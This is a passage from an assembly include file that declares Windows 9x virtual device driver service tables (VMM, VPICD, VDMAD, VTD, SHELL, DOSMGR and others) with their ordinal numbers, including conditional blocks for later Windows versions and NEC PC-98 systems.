  VMM_Service Set_VM_Static_Boost                      ; 0x0169 ord
  VMM_Service Release_Inversion_Pri_ID                 ; 0x016a ord
  VMM_Service Attach_Thread_To_Group                   ; 0x016b ord
  VMM_Service Detach_Thread_From_Group                 ; 0x016c ord
  VMM_Service Set_Group_Static_Boost                   ; 0x016d ord
  VMM_Service _GetRegistryPath                         ; 0x016e ord
  VMM_Service _GetRegistryKey                          ; 0x016f ord
  VMM_Service Cleanup_Thread_State                     ; 0x0170 ord
  VMM_Service _RegRemapPreDefKey                       ; 0x0171 ord
  VMM_Service End_V86_Serialization                    ; 0x0172 ord
  VMM_Service _Assert_Range                            ; 0x0173 ord
  VMM_Service _Sprintf                                 ; 0x0174 ord
  VMM_Service _PageChangePager                         ; 0x0175 ord
  VMM_Service _RegCreateDynKey                         ; 0x0176 ord
  VMM_Service _RegQueryMultipleValues                  ; 0x0177 ord
  VMM_Service Boost_Thread_With_VM                     ; 0x0178 ord
  VMM_Service Get_Boot_Flags                           ; 0x0179 ord
  VMM_Service Set_Boot_Flags                           ; 0x017a ord
  VMM_Service _lstrcpyn                                ; 0x017b ord
  VMM_Service _lstrlen                                 ; 0x017c ord
  VMM_Service _lmemcpy                                 ; 0x017d ord
  VMM_Service _GetVxDName                              ; 0x017e ord
  VMM_Service Force_Mutexes_Free                       ; 0x017f ord
  VMM_Service Restore_Forced_Mutexes                   ; 0x0180 ord
  VMM_Service _AddReclaimableItem                      ; 0x0181 ord
  VMM_Service _SetReclaimableItem                      ; 0x0182 ord
  VMM_Service _EnumReclaimableItem                     ; 0x0183 ord
  VMM_Service Time_Slice_Wake_Sys_VM                   ; 0x0184 ord
  VMM_Service VMM_Replace_Global_Environment           ; 0x0185 ord
  VMM_Service Begin_Non_Serial_Nest_V86_Exec           ; 0x0186 ord
  VMM_Service Get_Nest_Exec_Status                     ; 0x0187 ord
  VMM_Service Open_Boot_Log                            ; 0x0188 ord
  VMM_Service Write_Boot_Log                           ; 0x0189 ord
  VMM_Service Close_Boot_Log                           ; 0x018a ord
  VMM_Service EnableDisable_Boot_Log                   ; 0x018b ord
  VMM_Service _Call_On_My_Stack                        ; 0x018c ord
  VMM_Service Get_Inst_V86_Int_Vec_Base                ; 0x018d ord
  VMM_Service _lstrcmpi                                ; 0x018e ord
  VMM_Service _strupr                                  ; 0x018f ord
  VMM_Service Log_Fault_Call_Out                       ; 0x0190 ord
  VMM_Service _AtEventTime                             ; 0x0191 ord

%ifdef WIN403SERVICES
  VMM_Service _PageOutPages                            ; 0x0192 ord
  VMM_Service _Call_On_My_Not_Flat_Stack               ; 0x0193 ord
  VMM_Service _LinRegionLock                           ; 0x0194 ord
  VMM_Service _LinRegionUnLock                         ; 0x0195 ord
  VMM_Service _AttemptingSomethingDangerous            ; 0x0196 ord
  VMM_Service _Vsprintf                                ; 0x0197 ord
  VMM_Service _Vsprintfw                               ; 0x0198 ord
  VMM_Service Load_FS_Service                          ; 0x0199 ord
  VMM_Service Assert_FS_Service                        ; 0x019a ord
  VMM_Service ObsoleteRtlUnwind                        ; 0x019b ord
  VMM_Service ObsoleteRtlRaiseException                ; 0x019c ord
  VMM_Service ObsoleteRtlRaiseStatus                   ; 0x019d ord
  VMM_Service ObsoleteKeGetCurrentIrql                 ; 0x019e ord
  VMM_Service ObsoleteKfRaiseIrql                      ; 0x019f ord
  VMM_Service ObsoleteKfLowerIrql                      ; 0x01a0 ord
  VMM_Service _Begin_Preemptable_Code                  ; 0x01a1 ord
  VMM_Service _End_Preemptable_Code                    ; 0x01a2 ord
  VMM_Service Set_Preemptable_Count                    ; 0x01a3 ord
  VMM_Service ObsoleteKeInitializeDpc                  ; 0x01a4 ord
  VMM_Service ObsoleteKeInsertQueueDpc                 ; 0x01a5 ord
  VMM_Service ObsoleteKeRemoveQueueDpc                 ; 0x01a6 ord
  VMM_Service HeapAllocateEx                           ; 0x01a7 ord
  VMM_Service HeapReAllocateEx                         ; 0x01a8 ord
  VMM_Service HeapGetSizeEx                            ; 0x01a9 ord
  VMM_Service HeapFreeEx                               ; 0x01aa ord
  VMM_Service _Get_CPUID_Flags                         ; 0x01ab ord
  VMM_Service KeCheckDivideByZeroTrap                  ; 0x01ac ord
%endif

%ifdef WIN41SERVICES
  VMM_Service _RegisterGARTHandler                     ; 0x01ad ord
  VMM_Service _GARTReserve                             ; 0x01ae ord
  VMM_Service _GARTCommit                              ; 0x01af ord
  VMM_Service _GARTUnCommit                            ; 0x01b0 ord
  VMM_Service _GARTFree                                ; 0x01b1 ord
  VMM_Service _GARTMemAttributes                       ; 0x01b2 ord
  VMM_Service KfRaiseIrqlToDpcLevel                    ; 0x01b3 ord
  VMM_Service VMMCreateThreadEx                        ; 0x01b4 ord
  VMM_Service _FlushCaches                             ; 0x01b5 ord
  VMM_Service Set_Thread_Win32_Pri_NoYield             ; 0x01b6 ord
  VMM_Service _FlushMappedCacheBlock                   ; 0x01b7 ord
  VMM_Service _ReleaseMappedCacheBlock                 ; 0x01b8 ord
  VMM_Service Run_Preemptable_Events                   ; 0x01b9 ord
  VMM_Service _MMPreSystemExit                         ; 0x01ba ord
  VMM_Service _MMPageFileShutDown                      ; 0x01bb ord
  VMM_Service _Set_Global_Time_Out_Ex                  ; 0x01bc ord
  VMM_Service Query_Thread_Priority                    ; 0x01bd ord
%endif
End_Service_Table VMM

Begin_Service_Table DEBUG	; 0x0002
  DEBUG_Service DEBUG_Get_Version                        ; 0x0000 ord
  DEBUG_Service DEBUG_Fault                              ; 0x0001 ord
  DEBUG_Service DEBUG_CheckFault                         ; 0x0002 ord
  DEBUG_Service _DEBUG_LoadSyms                          ; 0x0003 ord
End_Service_Table DEBUG

Begin_Service_Table VPICD	; 0x0003
  VPICD_Service VPICD_Get_Version                        ; 0x0000 ord
  VPICD_Service VPICD_Virtualize_IRQ                     ; 0x0001 ord
  VPICD_Service VPICD_Set_Int_Request                    ; 0x0002 ord
  VPICD_Service VPICD_Clear_Int_Request                  ; 0x0003 ord
  VPICD_Service VPICD_Phys_EOI                           ; 0x0004 ord
  VPICD_Service VPICD_Get_Complete_Status                ; 0x0005 ord
  VPICD_Service VPICD_Get_Status                         ; 0x0006 ord
  VPICD_Service VPICD_Test_Phys_Request                  ; 0x0007 ord
  VPICD_Service VPICD_Physically_Mask                    ; 0x0008 ord
  VPICD_Service VPICD_Physically_Unmask                  ; 0x0009 ord
  VPICD_Service VPICD_Set_Auto_Masking                   ; 0x000a ord
  VPICD_Service VPICD_Get_IRQ_Complete_Status            ; 0x000b ord
  VPICD_Service VPICD_Convert_Handle_To_IRQ              ; 0x000c ord
  VPICD_Service VPICD_Convert_IRQ_To_Int                 ; 0x000d ord
  VPICD_Service VPICD_Convert_Int_To_IRQ                 ; 0x000e ord
  VPICD_Service VPICD_Call_When_Hw_Int                   ; 0x000f ord
  VPICD_Service VPICD_Force_Default_Owner                ; 0x0010 ord
  VPICD_Service VPICD_Force_Default_Behavior             ; 0x0011 ord
  VPICD_Service VPICD_Auto_Mask_At_Inst_Swap             ; 0x0012 ord
  VPICD_Service VPICD_Begin_Inst_Page_Swap               ; 0x0013 ord
  VPICD_Service VPICD_End_Inst_Page_Swap                 ; 0x0014 ord
  VPICD_Service VPICD_Virtual_EOI                        ; 0x0015 ord
  VPICD_Service VPICD_Get_Virtualization_Count           ; 0x0016 ord
  VPICD_Service VPICD_Post_Sys_Critical_Init             ; 0x0017 ord
  VPICD_Service VPICD_VM_SlavePIC_Mask_Change            ; 0x0018 ord
  VPICD_Service _VPICD_Clear_IR_Bits                     ; 0x0019 ord
  VPICD_Service _VPICD_Get_Level_Mask                    ; 0x001a ord
  VPICD_Service _VPICD_Set_Level_Mask                    ; 0x001b ord
  VPICD_Service _VPICD_Set_Irql_Mask                     ; 0x001c ord
  VPICD_Service _VPICD_Set_Channel_Irql                  ; 0x001d ord
  VPICD_Service _VPICD_Prepare_For_Shutdown              ; 0x001e ord
  VPICD_Service _VPICD_Register_Trigger_Handler          ; 0x001f ord
End_Service_Table VPICD

Begin_Service_Table VDMAD	; 0x0004
  VDMAD_Service VDMAD_Get_Version                        ; 0x0000 ord
  VDMAD_Service VDMAD_Virtualize_Channel                 ; 0x0001 ord
  VDMAD_Service VDMAD_Get_Region_Info                    ; 0x0002 ord
  VDMAD_Service VDMAD_Set_Region_Info                    ; 0x0003 ord
  VDMAD_Service VDMAD_Get_Virt_State                     ; 0x0004 ord
  VDMAD_Service VDMAD_Set_Virt_State                     ; 0x0005 ord
  VDMAD_Service VDMAD_Set_Phys_State                     ; 0x0006 ord
  VDMAD_Service VDMAD_Mask_Channel                       ; 0x0007 ord
  VDMAD_Service VDMAD_UnMask_Channel                     ; 0x0008 ord
  VDMAD_Service VDMAD_Lock_DMA_Region                    ; 0x0009 ord
  VDMAD_Service VDMAD_Unlock_DMA_Region                  ; 0x000a ord
  VDMAD_Service VDMAD_Scatter_Lock                       ; 0x000b ord
  VDMAD_Service VDMAD_Scatter_Unlock                     ; 0x000c ord
  VDMAD_Service VDMAD_Reserve_Buffer_Space               ; 0x000d ord
  VDMAD_Service VDMAD_Request_Buffer                     ; 0x000e ord
  VDMAD_Service VDMAD_Release_Buffer                     ; 0x000f ord
  VDMAD_Service VDMAD_Copy_To_Buffer                     ; 0x0010 ord
  VDMAD_Service VDMAD_Copy_From_Buffer                   ; 0x0011 ord
  VDMAD_Service VDMAD_Default_Handler                    ; 0x0012 ord
  VDMAD_Service VDMAD_Disable_Translation                ; 0x0013 ord
  VDMAD_Service VDMAD_Enable_Translation                 ; 0x0014 ord
  VDMAD_Service VDMAD_Get_EISA_Adr_Mode                  ; 0x0015 ord
  VDMAD_Service VDMAD_Set_EISA_Adr_Mode                  ; 0x0016 ord
  VDMAD_Service VDMAD_Unlock_DMA_Region_No_Dirty         ; 0x0017 ord
  VDMAD_Service VDMAD_Phys_Mask_Channel                  ; 0x0018 ord
  VDMAD_Service VDMAD_Phys_Unmask_Channel                ; 0x0019 ord
  VDMAD_Service VDMAD_Unvirtualize_Channel               ; 0x001a ord
  VDMAD_Service VDMAD_Set_IO_Address                     ; 0x001b ord
  VDMAD_Service VDMAD_Get_Phys_Count                     ; 0x001c ord
  VDMAD_Service VDMAD_Get_Phys_Status                    ; 0x001d ord
  VDMAD_Service VDMAD_Get_Max_Phys_Page                  ; 0x001e ord
  VDMAD_Service VDMAD_Set_Channel_Callbacks              ; 0x001f ord
  VDMAD_Service VDMAD_Get_Virt_Count                     ; 0x0020 ord
  VDMAD_Service VDMAD_Set_Virt_Count                     ; 0x0021 ord
  VDMAD_Service VDMAD_Get_Virt_Address                   ; 0x0022 ord
  VDMAD_Service VDMAD_Set_Virt_Address                   ; 0x0023 ord
End_Service_Table VDMAD

Begin_Service_Table VTD	; 0x0005
  VTD_Service VTD_Get_Version                          ; 0x0000 ord
  VTD_Service VTD_Update_System_Clock                  ; 0x0001 ord
  VTD_Service VTD_Get_Interrupt_Period                 ; 0x0002 ord
  VTD_Service VTD_Begin_Min_Int_Period                 ; 0x0003 ord
  VTD_Service VTD_End_Min_Int_Period                   ; 0x0004 ord
  VTD_Service VTD_Disable_Trapping                     ; 0x0005 ord
  VTD_Service VTD_Enable_Trapping                      ; 0x0006 ord
  VTD_Service VTD_Get_Real_Time                        ; 0x0007 ord
  VTD_Service VTD_Get_Date_And_Time                    ; 0x0008 ord
  VTD_Service VTD_Adjust_VM_Count                      ; 0x0009 ord
  VTD_Service VTD_Delay                                ; 0x000a ord
  VTD_Service VTD_GetTimeZoneBias                      ; 0x000b ord
  VTD_Service ObsoleteKeQueryPerformanceCounter        ; 0x000c ord
  VTD_Service ObsoleteKeQuerySystemTime                ; 0x000d ord
  VTD_Service VTD_Install_IO_Handle                    ; 0x000e ord
  VTD_Service VTD_Remove_IO_Handle                     ; 0x000f ord
  VTD_Service _VTD_Delay_Ex                            ; 0x0010 ord
  VTD_Service VTD_Init_Timer                           ; 0x0011 ord
End_Service_Table VTD

Begin_Service_Table V86MMGR	; 0x0006
  V86MMGR_Service V86MMGR_Get_Version                      ; 0x0000 ord
  V86MMGR_Service V86MMGR_Allocate_V86_Pages               ; 0x0001 ord
  V86MMGR_Service V86MMGR_Set_EMS_XMS_Limits               ; 0x0002 ord
  V86MMGR_Service V86MMGR_Get_EMS_XMS_Limits               ; 0x0003 ord
  V86MMGR_Service V86MMGR_Set_Mapping_Info                 ; 0x0004 ord
  V86MMGR_Service V86MMGR_Get_Mapping_Info                 ; 0x0005 ord
  V86MMGR_Service V86MMGR_Xlat_API                         ; 0x0006 ord
  V86MMGR_Service V86MMGR_Load_Client_Ptr                  ; 0x0007 ord
  V86MMGR_Service V86MMGR_Allocate_Buffer                  ; 0x0008 ord
  V86MMGR_Service V86MMGR_Free_Buffer                      ; 0x0009 ord
  V86MMGR_Service V86MMGR_Get_Xlat_Buff_State              ; 0x000a ord
  V86MMGR_Service V86MMGR_Set_Xlat_Buff_State              ; 0x000b ord
  V86MMGR_Service V86MMGR_Get_VM_Flat_Sel                  ; 0x000c ord
  V86MMGR_Service V86MMGR_Map_Pages                        ; 0x000d ord
  V86MMGR_Service V86MMGR_Free_Page_Map_Region             ; 0x000e ord
  V86MMGR_Service V86MMGR_LocalGlobalReg                   ; 0x000f ord
  V86MMGR_Service V86MMGR_GetPgStatus                      ; 0x0010 ord
  V86MMGR_Service V86MMGR_SetLocalA20                      ; 0x0011 ord
  V86MMGR_Service V86MMGR_ResetBasePages                   ; 0x0012 ord
  V86MMGR_Service V86MMGR_SetAvailMapPgs                   ; 0x0013 ord
  V86MMGR_Service V86MMGR_NoUMBInitCalls                   ; 0x0014 ord
  V86MMGR_Service V86MMGR_Get_EMS_XMS_Avail                ; 0x0015 ord
  V86MMGR_Service V86MMGR_Toggle_HMA                       ; 0x0016 ord
  V86MMGR_Service V86MMGR_Dev_Init                         ; 0x0017 ord
  V86MMGR_Service V86MMGR_Alloc_UM_Page                    ; 0x0018 ord
  V86MMGR_Service V86MMGR_Check_NHSupport                  ; 0x0019 ord
End_Service_Table V86MMGR

Begin_Service_Table PageSwap	; 0x0007
  PageSwap_Service PageSwap_Get_Version                     ; 0x0000 ord
  PageSwap_Service PageSwap_Invalid_Service1                ; 0x0001 ord
  PageSwap_Service PageSwap_Invalid_Service2                ; 0x0002 ord
  PageSwap_Service PageSwap_Invalid_Service3                ; 0x0003 ord
  PageSwap_Service PageSwap_Invalid_Service4                ; 0x0004 ord
  PageSwap_Service PageSwap_Invalid_Service5                ; 0x0005 ord
  PageSwap_Service PageSwap_Test_IO_Valid                   ; 0x0006 ord
  PageSwap_Service PageSwap_Read_Or_Write                   ; 0x0007 ord
  PageSwap_Service PageSwap_Grow_File                       ; 0x0008 ord
  PageSwap_Service PageSwap_Init_File                       ; 0x0009 ord
End_Service_Table PageSwap

Begin_Service_Table PARITY	; 0x0008
End_Service_Table PARITY

Begin_Service_Table REBOOT	; 0x0009
End_Service_Table REBOOT

Begin_Service_Table VDD	; 0x000a
%ifdef NEC_98
  VDD_Service VDD_Get_Version                          ; 0x0000 ord
  VDD_Service VDD_PIF_State                            ; 0x0001 ord
  VDD_Service VDD_Get_GrabRtn                          ; 0x0002 ord
  VDD_Service VDD_Hide_Cursor                          ; 0x0003 ord
  VDD_Service VDD_Set_VMType                           ; 0x0004 ord
  VDD_Service VDD_Get_ModTime                          ; 0x0005 ord
  VDD_Service VDD_Set_HCurTrk                          ; 0x0006 ord
  VDD_Service VDD_Msg_ClrScrn                          ; 0x0007 ord
  VDD_Service VDD_Msg_ForColor                         ; 0x0008 ord
  VDD_Service VDD_Msg_BakColor                         ; 0x0009 ord
  VDD_Service VDD_Msg_TextOut                          ; 0x000a ord
  VDD_Service VDD_Msg_SetCursPos                       ; 0x000b ord
  VDD_Service VDD_Query_Access                         ; 0x000c ord
  VDD_Service VDD_Check_Update_Soon                    ; 0x000d ord
  VDD_Service VDD_Get_Mini_Dispatch_Table              ; 0x000e ord
  VDD_Service VDD_Register_Virtual_Port                ; 0x000f ord
  VDD_Service VDD_Get_VM_Info                          ; 0x0010 ord
  VDD_Service VDD_Get_Special_VM_IDs                   ; 0x0011 ord
  VDD_Service VDD_Register_Extra_Screen_Selector       ; 0x0012 ord
  VDD_Service VDD_Takeover_VGA_Port                    ; 0x0013 ord
  VDD_Service VDD_Get_DISPLAYINFO                      ; 0x0014 ord
  VDD_Service VDD_Do_Physical_IO                       ; 0x0015 ord
  VDD_Service VDD_Register_Mini_VDD                    ; 0x0016 ord
  VDD_Service VDD_Install_IO_Handler                   ; 0x0017 ord
  VDD_Service VDD_Install_Mult_IO_Handlers             ; 0x0018 ord
  VDD_Service VDD_Enable_Local_Trapping                ; 0x0019 ord
  VDD_Service VDD_Disable_Local_Trapping               ; 0x001a ord
  VDD_Service VDD_Trap_Suspend                         ; 0x001b ord
  VDD_Service Test_Vid_VM_Handle                       ; 0x001c ord
  VDD_Service VDD_Set_Core_Graphics                    ; 0x001d ord
  VDD_Service VDD_Load_AccBIOS                         ; 0x001e ord
  VDD_Service VDD_Map_AccBIOS                          ; 0x001f ord
  VDD_Service VDD_Map_VRAM                             ; 0x0020 ord
  VDD_Service VDD_EnableDevice                         ; 0x0021 ord
%else
  VDD_Service VDD_Get_Version                          ; 0x0000 ord
  VDD_Service VDD_PIF_State                            ; 0x0001 ord
  VDD_Service VDD_Get_GrabRtn                          ; 0x0002 ord
  VDD_Service VDD_Hide_Cursor                          ; 0x0003 ord
  VDD_Service VDD_Set_VMType                           ; 0x0004 ord
  VDD_Service VDD_Get_ModTime                          ; 0x0005 ord
  VDD_Service VDD_Set_HCurTrk                          ; 0x0006 ord
  VDD_Service VDD_Msg_ClrScrn                          ; 0x0007 ord
  VDD_Service VDD_Msg_ForColor                         ; 0x0008 ord
  VDD_Service VDD_Msg_BakColor                         ; 0x0009 ord
  VDD_Service VDD_Msg_TextOut                          ; 0x000a ord
  VDD_Service VDD_Msg_SetCursPos                       ; 0x000b ord
  VDD_Service VDD_Query_Access                         ; 0x000c ord
  VDD_Service VDD_Check_Update_Soon                    ; 0x000d ord
  VDD_Service VDD_Get_Mini_Dispatch_Table              ; 0x000e ord
  VDD_Service VDD_Register_Virtual_Port                ; 0x000f ord
  VDD_Service VDD_Get_VM_Info                          ; 0x0010 ord
  VDD_Service VDD_Get_Special_VM_IDs                   ; 0x0011 ord
  VDD_Service VDD_Register_Extra_Screen_Selector       ; 0x0012 ord
  VDD_Service VDD_Takeover_VGA_Port                    ; 0x0013 ord
  VDD_Service VDD_Get_DISPLAYINFO                      ; 0x0014 ord
  VDD_Service VDD_Do_Physical_IO                       ; 0x0015 ord
  VDD_Service VDD_Set_Sleep_Flag_Addr                  ; 0x0016 ord
  VDD_Service VDD_EnableDevice                         ; 0x0017 ord
%endif
End_Service_Table VDD

Begin_Service_Table VSD	; 0x000b
  VSD_Service VSD_Get_Version                          ; 0x0000 ord
  VSD_Service VSD_Bell                                 ; 0x0001 ord
  VSD_Service VSD_SoundOn                              ; 0x0002 ord
  VSD_Service VSD_TakeSoundPort                        ; 0x0003 ord
End_Service_Table VSD

Begin_Service_Table VMD	; 0x000c
  VMD_Service VMD_Get_Version                          ; 0x0000 ord
  VMD_Service VMD_Set_Mouse_Type                       ; 0x0001 ord
  VMD_Service VMD_Get_Mouse_Owner                      ; 0x0002 ord
End_Service_Table VMD

Begin_Service_Table VKD	; 0x000d
  VKD_Service VKD_Get_Version                          ; 0x0000 ord
  VKD_Service VKD_Define_Hot_Key                       ; 0x0001 ord
  VKD_Service VKD_Remove_Hot_Key                       ; 0x0002 ord
  VKD_Service VKD_Local_Enable_Hot_Key                 ; 0x0003 ord
  VKD_Service VKD_Local_Disable_Hot_Key                ; 0x0004 ord
  VKD_Service VKD_Reflect_Hot_Key                      ; 0x0005 ord
  VKD_Service VKD_Cancel_Hot_Key_State                 ; 0x0006 ord
  VKD_Service VKD_Force_Keys                           ; 0x0007 ord
  VKD_Service VKD_Get_Kbd_Owner                        ; 0x0008 ord
  VKD_Service VKD_Define_Paste_Mode                    ; 0x0009 ord
  VKD_Service VKD_Start_Paste                          ; 0x000a ord
  VKD_Service VKD_Cancel_Paste                         ; 0x000b ord
  VKD_Service VKD_Get_Msg_Key                          ; 0x000c ord
  VKD_Service VKD_Peek_Msg_Key                         ; 0x000d ord
  VKD_Service VKD_Flush_Msg_Key_Queue                  ; 0x000e ord
  VKD_Service VKD_Enable_Keyboard                      ; 0x000f ord
  VKD_Service VKD_Disable_Keyboard                     ; 0x0010 ord
  VKD_Service VKD_Get_Shift_State                      ; 0x0011 ord
  VKD_Service VKD_Filter_Keyboard_Input                ; 0x0012 ord
  VKD_Service VKD_Put_Byte                             ; 0x0013 ord
  VKD_Service VKD_Set_Shift_State                      ; 0x0014 ord
  VKD_Service VKD_Send_Data                            ; 0x0015 ord
  VKD_Service VKD_Set_LEDs                             ; 0x0016 ord
  VKD_Service VKD_Set_Key_Rate                         ; 0x0017 ord
End_Service_Table VKD

Begin_Service_Table VCD	; 0x000e
  VCD_Service VCD_Get_Version                          ; 0x0000 ord
  VCD_Service VCD_Set_Port_Global                      ; 0x0001 ord
  VCD_Service VCD_Get_Focus                            ; 0x0002 ord
  VCD_Service VCD_Virtualize_Port                      ; 0x0003 ord
  VCD_Service VCD_Acquire_Port                         ; 0x0004 ord
  VCD_Service VCD_Free_Port                            ; 0x0005 ord
  VCD_Service VCD_Acquire_Port_Windows_Style           ; 0x0006 ord
  VCD_Service VCD_Free_Port_Windows_Style              ; 0x0007 ord
  VCD_Service VCD_Steal_Port_Windows_Style             ; 0x0008 ord
  VCD_Service VCD_Find_COM_Index                       ; 0x0009 ord
  VCD_Service VCD_Set_Port_Global_Special              ; 0x000a ord
  VCD_Service VCD_Virtualize_Port_Dynamic              ; 0x000b ord
  VCD_Service VCD_Unvirtualize_Port_Dynamic            ; 0x000c ord
End_Service_Table VCD

Begin_Service_Table VPD	; 0x000f
End_Service_Table VPD

Begin_Service_Table BlockDev	; 0x0010
  BlockDev_Service BlockDev_Get_Version                     ; 0x0000 ord
  BlockDev_Service BlockDev_Register_Device                 ; 0x0001 ord
  BlockDev_Service BlockDev_Find_Int13_Drive                ; 0x0002 ord
  BlockDev_Service BlockDev_Get_Device_List                 ; 0x0003 ord
  BlockDev_Service BlockDev_Send_Command                    ; 0x0004 ord
  BlockDev_Service BlockDev_Command_Complete                ; 0x0005 ord
  BlockDev_Service BlockDev_Synchronous_Command             ; 0x0006 ord
End_Service_Table BlockDev

Begin_Service_Table VMCPD	; 0x0011
  VMCPD_Service VMCPD_Get_Version                        ; 0x0000 ord
  VMCPD_Service VMCPD_Get_Virt_State                     ; 0x0001 ord
  VMCPD_Service VMCPD_Set_Virt_State                     ; 0x0002 ord
  VMCPD_Service VMCPD_Get_CR0_State                      ; 0x0003 ord
  VMCPD_Service VMCPD_Set_CR0_State                      ; 0x0004 ord
  VMCPD_Service VMCPD_Get_Thread_State                   ; 0x0005 ord
  VMCPD_Service VMCPD_Set_Thread_State                   ; 0x0006 ord
  VMCPD_Service _VMCPD_Get_FP_Instruction_Size           ; 0x0007 ord
  VMCPD_Service VMCPD_Set_Thread_Precision               ; 0x0008 ord
  VMCPD_Service VMCPD_Init_FP                            ; 0x0009 ord
  VMCPD_Service _KeSaveFloatingPointState                ; 0x000a ord
  VMCPD_Service _KeRestoreFloatingPointState             ; 0x000b ord
  VMCPD_Service VMCPD_Init_FP_State                      ; 0x000c ord
End_Service_Table VMCPD

Begin_Service_Table EBIOS	; 0x0012
  EBIOS_Service EBIOS_Get_Version                        ; 0x0000 ord
  EBIOS_Service EBIOS_Get_Unused_Mem                     ; 0x0001 ord
End_Service_Table EBIOS

Begin_Service_Table BIOSXLAT	; 0x0013
End_Service_Table BIOSXLAT

Begin_Service_Table VNETBIOS	; 0x0014
  VNETBIOS_Service VNETBIOS_Get_Version                     ; 0x0000 ord
  VNETBIOS_Service VNETBIOS_Register                        ; 0x0001 ord
  VNETBIOS_Service VNETBIOS_Submit                          ; 0x0002 ord
  VNETBIOS_Service VNETBIOS_Enum                            ; 0x0003 ord
  VNETBIOS_Service VNETBIOS_Deregister                      ; 0x0004 ord
  VNETBIOS_Service VNETBIOS_Register2                       ; 0x0005 ord
  VNETBIOS_Service VNETBIOS_Map                             ; 0x0006 ord
  VNETBIOS_Service VNETBIOS_Enum2                           ; 0x0007 ord
End_Service_Table VNETBIOS

Begin_Service_Table DOSMGR	; 0x0015
  DOSMGR_Service DOSMGR_Get_Version                       ; 0x0000 ord
  DOSMGR_Service _DOSMGR_Set_Exec_VM_Data                 ; 0x0001 ord
  DOSMGR_Service DOSMGR_Copy_VM_Drive_State               ; 0x0002 ord
  DOSMGR_Service _DOSMGR_Exec_VM                          ; 0x0003 ord
  DOSMGR_Service DOSMGR_Get_IndosPtr                      ; 0x0004 ord
  DOSMGR_Service DOSMGR_Add_Device                        ; 0x0005 ord
  DOSMGR_Service DOSMGR_Remove_Device                     ; 0x0006 ord
  DOSMGR_Service DOSMGR_Instance_Device                   ; 0x0007 ord
  DOSMGR_Service DOSMGR_Get_DOS_Crit_Status               ; 0x0008 ord
  DOSMGR_Service DOSMGR_Enable_Indos_Polling              ; 0x0009 ord
  DOSMGR_Service DOSMGR_BackFill_Allowed                  ; 0x000a ord
  DOSMGR_Service DOSMGR_LocalGlobalReg                    ; 0x000b ord
  DOSMGR_Service DOSMGR_Init_UMB_Area                     ; 0x000c ord
  DOSMGR_Service DOSMGR_Begin_V86_App                     ; 0x000d ord
  DOSMGR_Service DOSMGR_End_V86_App                       ; 0x000e ord
  DOSMGR_Service DOSMGR_Alloc_Local_Sys_VM_Mem            ; 0x000f ord
  DOSMGR_Service DOSMGR_Grow_CDSs                         ; 0x0010 ord
  DOSMGR_Service DOSMGR_Translate_Server_DOS_Call         ; 0x0011 ord
  DOSMGR_Service DOSMGR_MMGR_PSP_Change_Notifier          ; 0x0012 ord
End_Service_Table DOSMGR

Begin_Service_Table WINLOAD	; 0x0016
End_Service_Table WINLOAD

Begin_Service_Table SHELL	; 0x0017
  SHELL_Service SHELL_Get_Version                        ; 0x0000 ord
  SHELL_Service SHELL_Resolve_Contention                 ; 0x0001 ord
  SHELL_Service SHELL_Event                              ; 0x0002 ord
  SHELL_Service SHELL_SYSMODAL_Message                   ; 0x0003 ord
  SHELL_Service SHELL_Message                            ; 0x0004 ord
  SHELL_Service SHELL_GetVMInfo                          ; 0x0005 ord
  SHELL_Service _SHELL_PostMessage                       ; 0x0006 ord
  SHELL_Service _SHELL_ShellExecute                      ; 0x0007 ord
  SHELL_Service _SHELL_PostShellMessage                  ; 0x0008 ord
  SHELL_Service SHELL_DispatchRing0AppyEvents            ; 0x0009 ord
  SHELL_Service SHELL_Hook_Properties                    ; 0x000a ord
  SHELL_Service SHELL_Unhook_Properties                  ; 0x000b ord
  SHELL_Service SHELL_Update_User_Activity               ; 0x000c ord
  SHELL_Service _SHELL_QueryAppyTimeAvailable            ; 0x000d ord
  SHELL_Service _SHELL_CallAtAppyTime                    ; 0x000e ord
  SHELL_Service _SHELL_CancelAppyTimeEvent               ; 0x000f ord
  SHELL_Service _SHELL_BroadcastSystemMessage            ; 0x0010 ord
  SHELL_Service _SHELL_HookSystemBroadcast               ; 0x0011 ord
  SHELL_Service _SHELL_UnhookSystemBroadcast             ; 0x0012 ord
  SHELL_Service _SHELL_LocalAllocEx                      ; 0x0013 ord
  SHELL_Service _SHELL_LocalFree                         ; 0x0014 ord
  SHELL_Service _SHELL_LoadLibrary                       ; 0x0015 ord
  SHELL_Service _SHELL_FreeLibrary                       ; 0x0016 ord
  SHELL_Service _SHELL_GetProcAddress                    ; 0x0017 ord
  SHELL_Service _SHELL_CallDll                           ; 0x0018 ord
  SHELL_Service _SHELL_SuggestSingleMSDOSMode            ; 0x0019 ord
  SHELL_Service SHELL_CheckHotkeyAllowed                 ; 0x001a ord
  SHELL_Service _SHELL_GetDOSAppInfo                     ; 0x001b ord
  SHELL_Service _SHELL_Update_User_Activity_Ex           ; 0x001c ord
End_Service_Table SHELL

Begin_Service_Table VMPoll	; 0x0018
  VMPoll_Service VMPoll_Get_Version                       ; 0x0000 ord
  VMPoll_Service VMPoll_Enable_Disable                    ; 0x0001 ord
  VMPoll_Service VMPoll_Reset_Detection                   ; 0x0002 ord
  VMPoll_Service VMPoll_Check_Idle                        ; 0x0003 ord
End_Service_Table VMPoll

Begin_Service_Table VPROD	; 0x0019
End_Service_Table VPROD

Begin_Service_Table DOSNET	; 0x001a
  DOSNET_Service DOSNET_Get_Version                       ; 0x0000 ord
  DOSNET_Service DOSNET_Send_FILESYSCHANGE                ; 0x0001 ord
  DOSNET_Service DOSNET_Do_PSP_Adjust                     ; 0x0002 ord
End_Service_Table DOSNET

Begin_Service_Table VFD	; 0x001b
  VFD_Service VFD_Get_Version                          ; 0x0000 ord
End_Service_Table VFD

Begin_Service_Table VDD2	; 0x001c
  VDD2_Service VDD2_Get_Version                         ; 0x0000 ord
End_Service_Table VDD2

Begin_Service_Table WINDEBUG	; 0x001d
End_Service_Table WINDEBUG

Begin_Service_Table TSRLOAD	; 0x001e
End_Service_Table TSRLOAD

Begin_Service_Table BIOSHOOK	; 0x001f
End_Service_Table BIOSHOOK

Begin_Service_Table Int13	; 0x0020
  Int13_Service Int13_Get_Version                        ; 0x0000 ord
  Int13_Service Int13_Device_Registered                  ; 0x0001 ord
  Int13_Service Int13_Translate_VM_Int                   ; 0x0002 ord
  Int13_Service Int13_Hooking_BIOS_Int                   ; 0x0003 ord
  Int13_Service Int13_Unhooking_BIOS_Int                 ; 0x0004 ord
End_Service_Table Int13

Begin_Service_Table PageFile	; 0x0021
  PageFile_Service PageFile_Get_Version                     ; 0x0000 ord
